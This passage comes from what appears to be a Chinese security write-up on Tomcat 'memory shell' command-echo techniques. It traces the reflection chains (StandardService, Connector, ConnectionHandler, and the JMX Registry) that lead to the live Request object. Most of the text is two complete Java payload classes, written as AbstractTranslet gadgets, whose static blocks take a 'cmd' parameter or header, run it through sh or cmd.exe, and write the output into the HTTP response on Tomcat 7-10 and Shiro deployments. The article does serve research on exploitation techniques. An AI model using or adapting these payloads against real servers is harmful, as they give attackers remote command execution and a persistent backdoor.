2. 获取到了Http11NioProtocol，才能调用其父类AbstractHttp11Protocol的getHandler或者反射 去获取AbstractHttp11Protocol构造函数所创建的AbstarctProtocol$ConnectionHandler。以上都是因为ConnectionHandler是个内部类带来的麻烦事
3. 获取到了ConnectionHandler，就可以反射获取global静态字段，global实际上是RequestGroupInfo，可以按照RequestGroupInfo->RequestInfo->Request的方式获取到StandardContext

那怎么获取Connector？还是这个图，可以看到connector属于Service

![](images/20250307110633-2cb6dee5-fb01-1.png)

虽然从栈上已经无法从connector追溯到Servcie，因为Http请求到达Server，Tomcat 分发到Service，对于一个单独的Http请求，Service会用一个单独的线程去处理。所以向上追溯是线程启动的栈帧。

不过我们明显可以知道，Tomcat Service指的就是StandardService

从代码上来讲就是，Tomcat在启动时默认调用org.apache.catalina.startup.Tomcat#init()，然后调用到getConnector

![](images/20250307110656-3a61050f-fb01-1.png)

getConnector()首先调用getService()，然后调用addConnector

![](images/20250307110657-3adf0457-fb01-1.png)

addConnector把connector都放到了connectors数组里

![](images/20250307110658-3b9f56cb-fb01-1.png)

从变量能直接看出上面的关系：StandardService->connectors->Connector

![](images/20250307110659-3c233d62-fb01-1.png)

最后一个问题，如何获取StandardService？通过上面的getContextClassLoader()->resources->getContext()先获取StandardContext

```
WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            Field webappclassLoaderBaseField=Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources");
            webappclassLoaderBaseField.setAccessible(true);
            WebResourceRoot resources=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);
            Context StandardContext =  resources.getContext();
```

StandardContext->context(ApplicationContext)->service(StandardService)可以获取到StandardService

![](images/20250307110700-3cd5530b-fb01-1.png)

于是思路完整：

1. getContextClassLoader()->resources->getContext()先获取StandardContext。然后StandardContext->context(ApplicationContext)->service(StandardService)可以获取到StandardService。
2. 从StandardService->connectors->Connector的路径取出connector。connector内部有protocolHandler字段，存储着Http11NioProtocol
3. 获取到了Http11NioProtocol，才能调用其父类AbstractHttp11Protocol的getHandler或者反射 去获取AbstractHttp11Protocol构造函数所创建的AbstarctProtocol$ConnectionHandler。以上都是因为ConnectionHandler是个内部类带来的麻烦事
4. 获取到了ConnectionHandler，就可以反射获取global静态字段，global实际上是RequestGroupInfo，可以按照RequestGroupInfo->RequestInfo->Request的方式获取到Request

需要注意的是，以上调试都是在本地进行，很显然不同主机对应了不同的connectors；然后一个connectors下的global变量，一个主机也大概率也不会只有一条RequestInfo，所以需要进行两个遍历

```
package org.example.tomcatmemshell.servlet;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.loader.WebappClassLoaderBase;

import java.lang.reflect.Field;

//1. getContextClassLoader()->resources->getContext()先获取StandardContext。然后StandardContext->context(ApplicationContext)->service(StandardService)可以获取到StandardService。
//2. 从StandardService->connectors->Connector的路径取出connector。connector内部有protocolHandler字段，存储着Http11NioProtocol
//3. 获取到了Http11NioProtocol，才能调用其父类AbstractHttp11Protocol的getHandler或者反射 去获取AbstractHttp11Protocol构造函数所创建的`AbstarctProtocol$ConnectionHandler`。以上都是因为ConnectionHandler是个内部类带来的麻烦事
//4. 获取到了ConnectionHandler，就可以反射获取global静态字段，global实际上是RequestGroupInfo，可以按照RequestGroupInfo->RequestInfo->Request的方式获取到Request
//通用tomcat 7 8 9 10.
public class GenericTomcatMemShell2 extends AbstractTranslet {

    static {
        try {
            //传递的参数，后门标识
            String pass = "cmd";

            //获取WebappClassLoaderBase
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            Field webappclassLoaderBaseField=Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources");
            webappclassLoaderBaseField.setAccessible(true);
            WebResourceRoot resources=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);
            Context StandardContext =  resources.getContext();

            //获取ApplicationContext
            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");
            contextField.setAccessible(true);
            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(StandardContext);

            //获取StandardService
            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");
            serviceField.setAccessible(true);
            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);

            //获取Connector
            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();

            //找到指定的Connector
            for (int i = 0; i < connectors.length; i++) {
                if (connectors[i].getScheme().contains("http")) {
                    //获取protocolHandler、connectionHandler
                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();
                    java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler", null);
                    getHandlerMethod.setAccessible(true);
                    org.apache.tomcat.util.net.AbstractEndpoint.Handler connectionHandler = (org.apache.tomcat.util.net.AbstractEndpoint.Handler) getHandlerMethod.invoke(protocolHandler, null);

                    //获取RequestGroupInfo
                    java.lang.reflect.Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
                    globalField.setAccessible(true);
                    org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(connectionHandler);

                    //获取RequestGroupInfo中储存了RequestInfo的processors
                    java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");
                    processorsField.setAccessible(true);
                    java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);
                    for (int k = 0; k < list.size(); k++) {
                        org.apache.coyote.RequestInfo requestInfo = (org.apache.coyote.RequestInfo) list.get(k);
                        if (requestInfo.getCurrentQueryString().contains(pass)) {
                            //获取request
                            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");
                            requestField.setAccessible(true);
                            org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(requestInfo);
                            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);
                            //执行命令
                            String cmd = request.getParameter(pass);
                            if (cmd != null) {
                                String[] cmds = !System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                                java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                                java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\a");
                                String output = s.hasNext() ? s.next() : "";
                                //回显
                                java.io.Writer writer = request.getResponse().getWriter();
                                java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField("usingWriter");
                                usingWriter.setAccessible(true);
                                usingWriter.set(request.getResponse(), Boolean.FALSE);
                                writer.write(output);
                                writer.flush();
                            }
                            break;
                        }
                        break;
                    }
                    break;
                }
            }
        }
        catch (Exception e) {
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

# Tomcat直接写Response 3（Tomcat7,8,9 通用）

上面第二个手法适配了Tomcat8，9，10和shiro环境，但是Tomcat7+shiro的环境目前仍没有办法打入内存马，有没有其他办法不获取StandardContext就能获取到request？

该思路来自李三的《tomcat不出网回显连续剧第六集》

适用于Tomcat 7,8,9 任意环境，包括shiro

在AbstractProtocol$ConnectionHandler#register中，向(RequestInfo) rp中存入global后，又把rp存入了Registry

![](images/20250307110701-3d82f01f-fb01-1.png)

如果有办法从Registry中拿到RequestInfo，就可以绕过获取StandardContext的办法

因为已知Registry里肯定有RequestInfo，所以打个断点，计算器Registry.getRegistry(null, null)在调试变量里慢慢找就完了

![](images/20250307110703-3e706fec-fb01-1.png)

![](images/20250307110704-3f0d51e6-fb01-1.png)

列个变量链：

```
Registry.getRegistry(null, null) ->
    server(JmxMBeanServer) ->
    mbInterceprot(DefaultMBeanServerInterceptor) ->
    repository(Repository) ->
    domainTb(HashMap) ->
    "Catalina"(HashMap) ->
    value(HashMap) ->
    'name="http-nio-8080",type=GlobalRequestProcessor'(NameObject) ->
    value(NameObject) ->
    object(BaseModelMBean) ->
    resource(RequestGroupInfo) ->
    processors(ArrayList) ->
    RequestInfo
```

tomcat7,8获取这条链的方式大同小异，变化之处在于name="http-bio-8888",type=GlobalRequestProcessor，其中8888是tomcat服务端端口，在tomcat8里面bio变为nio。可以用http\*通配一下

获取到processors后仍然需要for循环，因为主机里不止一条RequestInfo。

```
package org.example.tomcatmemshell.servlet;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.tomcat.util.modeler.Registry;

import javax.management.MBeanServer;
import javax.management.ObjectName;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Set;

//Tomcat 7,8,9 通用
public class GenericTomcatMemShell3 extends AbstractTranslet {
    static {
        try {
            String pass = "cmd";
            MBeanServer mBeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object mbsInterceptor = field.get(mBeanServer);

            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository = (Repository) field.get(mbsInterceptor);
            Set<NamedObject> set = repository.query(new ObjectName("*:type=GlobalRequestProcessor,name="http*""), null);

            Iterator<NamedObject> it = set.iterator();
            while (it.hasNext()) {
                NamedObject namedObject = it.next();
                field = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("name");
                field.setAccessible(true);

                field = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object");
                field.setAccessible(true);
                Object obj = field.get(namedObject);

                field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                field.setAccessible(true);
                Object resource = field.get(obj);

                field = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                field.setAccessible(true);
                ArrayList processors = (ArrayList) field.get(resource);

                field = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                field.setAccessible(true);
                for (int i=0; i < processors.size(); i++) {
                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) field.get(processors.get(i));
                    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);

                    String cmd = request.getParameter(pass);
                    //shiro
                    //String cmd = request.getHeader(pass);
                    String[] cmds = !System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                    java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\a");
                    String out = s.hasNext() ? s.next() : "";

                    java.io.Writer writer = request.getResponse().getWriter();
                    java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField("usingWriter");
                    usingWriter.setAccessible(true);
                    usingWriter.set(request.getResponse(), Boolean.FALSE);
                    writer.write(out);
                    writer.flush();

                }
            }
        }catch (Throwable throwable) {
            throwable.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

shiro利用的话改成getHeader传参就行了

# 总结

总结一下几种目前Tomcat下通用的手法：

|  |  |
| --- | --- |
| **攻击方式** | **适用版本** |
| 取lastServicedRequest | 兼容Tomcat 7,8,9，在Tomcat6下无法使用，Shiro下无法使用 |
| 从AbstarctProtocol$ConnectionHandler取global静态字段 | 适用于Tomcat 8,9,10，可以用于shiro回显 |
| 直接从Registry读取 | 适用于Tomcat 7,8,9，可以用于shiro回显 |

总结一下几种Tomcat下 Java获取StandardContext的方法：

其实能取到Request就能取到StandardContext，也就是通过

WebappClassLoaderBase、lastServicedRequest、Registry都可以

另外还有Spring环境下获取Context的方法Landgrey大佬<https://landgrey.me/blog/12/>

参考：

<https://yzddmr6.com/posts/tomcat-context/>

<https://www.yuque.com/5tooc3a/jas/rrwg142g0aiq7i2r#>

<https://cmisl.github.io/2024/07/23/JAVA%E5%86%85%E5%AD%98%E9%A9%AC/>

<https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A>

<https://web.archive.org/web/20211027223514/https://scriptboy.cn/p/tomcat-filter-inject/>

<https://www.anquanke.com/post/id/198886>

<https://halfblue.github.io/2020/04/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/>
